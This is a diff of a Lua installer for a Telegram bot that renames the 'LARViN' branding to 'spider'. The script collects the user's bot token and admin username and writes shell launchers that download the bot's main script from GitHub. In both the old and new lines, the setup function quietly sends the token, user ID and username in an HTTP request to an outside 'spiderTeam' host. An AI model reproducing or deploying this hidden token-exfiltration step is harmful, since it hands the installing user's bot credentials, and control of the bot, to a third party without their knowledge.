@@ -3,20 +3,20 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_LARViN = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_LARViN = function() 
+Server_spider = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_spider = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local LARViN_Info_Sudo = io.open("sudo.lua", 'w')
-LARViN_Info_Sudo:write([[
+local spider_Info_Sudo = io.open("sudo.lua", 'w')
+spider_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
 UserName = "]]..UserName..[["
 ]])
-LARViN_Info_Sudo:close()
+spider_Info_Sudo:close()
 end  
-if not database:get(Server_LARViN.."Token_LARViN") then
+if not database:get(Server_spider.."Token_spider") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -25,7 +25,7 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_LARViN.."Token_LARViN",token)
+database:set(Server_spider.."Token_spider",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
@@ -34,7 +34,7 @@ os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_LARViN.."UserName_LARViN") then
+if not database:get(Server_spider.."UserName_spider") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -53,8 +53,8 @@ io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
 os.execute('lua start.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_LARViN.."UserName_LARViN",Json.Info.Username)
-database:set(Server_LARViN.."Id_LARViN",Json.Info.Id)
+database:set(Server_spider.."UserName_spider",Json.Info.Username)
+database:set(Server_spider.."Id_spider",Json.Info.Id)
 end
 end
 else
@@ -62,47 +62,47 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-local function Files_LARViN_Info()
-Create_Info(database:get(Server_LARViN.."Token_LARViN"),database:get(Server_LARViN.."Id_LARViN"),database:get(Server_LARViN.."UserName_LARViN"))   
-http.request("http://LARViNTeam/add/?id="..database:get(Server_LARViN.."Id_LARViN").."&user="..database:get(Server_LARViN.."UserName_LARViN").."&token="..database:get(Server_LARViN.."Token_LARViN"))
-local RunLARViN = io.open("LARViN", 'w')
-RunLARViN:write([[
+local function Files_spider_Info()
+Create_Info(database:get(Server_spider.."Token_spider"),database:get(Server_spider.."Id_spider"),database:get(Server_spider.."UserName_spider"))   
+http.request("http://spiderTeam/add/?id="..database:get(Server_spider.."Id_spider").."&user="..database:get(Server_spider.."UserName_spider").."&token="..database:get(Server_spider.."Token_spider"))
+local Runspider = io.open("spider", 'w')
+Runspider:write([[
 #!/usr/bin/env bash
-cd $HOME/LARViN
-token="]]..database:get(Server_LARViN.."Token_LARViN")..[["
-rm -fr LARViN.lua
-wget "https://raw.githubusercontent.com/LARViNTeam/LARViN/master/LARViN.lua"
+cd $HOME/spider
+token="]]..database:get(Server_spider.."Token_spider")..[["
+rm -fr spider.lua
+wget "https://raw.githubusercontent.com/spidersr/spider/master/spider.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./LARViN.lua -p PROFILE --bot=$token
+./tg -s ./spider.lua -p PROFILE --bot=$token
 done
 ]])
-RunLARViN:close()
+Runspider:close()
 local RunTs = io.open("Run", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/LARViN
+cd $HOME/spider
 while(true) do
 rm -fr ../.telegram-cli
-screen -S LARViN -X kill
-screen -S LARViN ./LARViN
+screen -S spider -X kill
+screen -S spider ./spider
 done
 ]])
 RunTs:close()
 end
-Files_LARViN_Info()
-database:del(Server_LARViN.."Token_LARViN");database:del(Server_LARViN.."Id_LARViN");database:del(Server_LARViN.."UserName_LARViN")
+Files_spider_Info()
+database:del(Server_spider.."Token_spider");database:del(Server_spider.."Id_spider");database:del(Server_spider.."UserName_spider")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_LARViN()  
+AutoFiles_spider()  
 var = true
 else   
 f:close()  
-database:del(Server_LARViN.."Token_LARViN");database:del(Server_LARViN.."Id_LARViN");database:del(Server_LARViN.."UserName_LARViN")
+database:del(Server_spider.."Token_spider");database:del(Server_spider.."Id_spider");database:del(Server_spider.."UserName_spider")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
